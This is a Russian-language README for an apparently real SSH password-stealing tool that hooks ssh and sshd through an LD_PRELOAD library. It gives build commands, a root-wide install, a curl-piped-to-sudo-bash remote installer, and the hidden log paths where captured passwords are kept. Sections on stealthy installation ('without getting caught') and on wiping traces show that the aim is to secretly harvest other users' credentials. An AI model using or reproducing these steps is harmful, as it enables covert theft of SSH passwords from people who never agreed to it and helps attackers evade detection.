# КАК ЮЗАТЬ ЭТУ ПРОГУ НОРМАЛЬНО

## ДВА РЕЖИМА ПЕРЕХВАТА ПАРОЛЕЙ
Эта прога перехватывает пароли двумя способами:
1. **КЛИЕНТСКИЙ РЕЖИМ** - когда хочешь словить пароли со своего компа (когда кто-то ссшится куда-то С ТВОЕГО КОМПА)
2. **СЕРВЕРНЫЙ РЕЖИМ** - когда хочешь словить пароли на сервере (когда кто-то ссшится НА ТВОЙ СЕРВЕР)

## САМЫЙ ЭФФЕКТИВНЫЙ СПОСОБ (ДЛЯ РЕАЛЬНОГО ПЕРЕХВАТА ПАРОЛЕЙ)
```
# Скачиваем из гитхаба
git clone https://github.com/Personaz1/ScrScr.git
cd ScrScr

# Системная установка (работает для ВСЕХ пользователей)
sudo ./root_install.sh
```

Всё! После этого ВСЕ пароли от SSH будут сливаться в файл `/var/log/.ssh_passwd.log` 

## ПРОСТОЙ ТЕСТ (ПРОСТО ПРОВЕРИТЬ ЧТО РАБОТАЕТ)
```
# 1. Скачиваем из гитхаба
git clone https://github.com/Personaz1/ScrScr.git

# 2. Заходим в папку
cd ScrScr

# 3. Собираем
make

# 4. Запускаем тестовый перехват
LD_PRELOAD=./libssh_inject.so ssh юзер@какой-то-сервер
```

После 4-го шага введите любой пароль (хоть неправильный), и он будет сохранен в /tmp/ssh_inj.dbg - так можешь проверить что прога работает.

## УСТАНОВКА НА УДАЛЕННУЮ МАШИНУ (ДЛЯ АДМИНОВ)
```
# Установка одной командой на удаленный сервер
curl -s https://raw.githubusercontent.com/Personaz1/ScrScr/main/root_quick_install.sh | sudo bash
```

## ЧЕ ЭТО ТАКОЕ ВАЩЕ?
Короче, эта прога палит пароли от SSH. Работает в двух режимах:
1. **КЛИЕНТСКИЙ** - перехватывает пароли когда кто-то коннектится с твоего компа куда-то
2. **СЕРВЕРНЫЙ** - перехватывает пароли когда кто-то коннектится к твоему серверу

Самый жирный эффект будет если поставить на тачку с правами рута - тогда поймаешь ВСЕ пароли всех юзеров!

## КАК СОБРАТЬ
Просто въебашь:
```
make
```
И все, библиотека собралась в libssh_inject.so. Если с первого раза не получилось, сначала сделай:
```
make clean
```

## БЫСТРЫЙ ТЕСТ (ДЛЯ СВОИХ)
```
# Создаем лог-файл
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Запускаем тест
LD_PRELOAD=./libssh_inject.so ssh любой_сервер
```

## СТАВИМ НА МАШИНУ (БЕЗ ПАЛЕВА)
```
# Собираем
make

# Создаем куда писать пароли
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Или просто запусти скрипт установки
./install.sh
```

## ГДЕ ИСКАТЬ ПАРОЛИ
Все перехваченные пароли сливаются в файлы:
```
# Для клиентского режима (без рута):
/tmp/ssh_inj.dbg

# Для режима рут (системная установка):
/var/log/.ssh_passwd.log

# Для серверного режима (без рута):
/tmp/sshd_inj.dbg
```

Просто кати `cat /var/log/.ssh_passwd.log` чтобы увидеть все пароли

## КАК УДАЛИТЬ СЛЕДЫ
Чтобы все почистить:
```
# Удаляем лог-файлы
rm -f /tmp/ssh_inj.dbg
rm -f /tmp/sshd_inj.dbg

# Если была системная установка:
sudo ./root_uninstall.sh

# Если была юзерская установка:
./uninstall.sh

# Чистим скомпилированные файлы
make clean
```
